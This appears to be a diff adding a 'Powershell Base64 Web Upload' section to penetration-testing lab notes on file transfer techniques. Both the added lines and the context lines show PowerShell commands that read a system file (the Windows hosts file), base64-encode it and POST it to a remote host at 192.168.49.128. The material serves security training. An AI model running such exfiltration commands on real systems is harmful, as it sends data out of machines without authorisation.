@@ -245,3 +245,10 @@ PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Win
 [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
 [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
 ```
+
+#### Powershell Base64 Web Upload
+```powershell
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) 
+
+PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
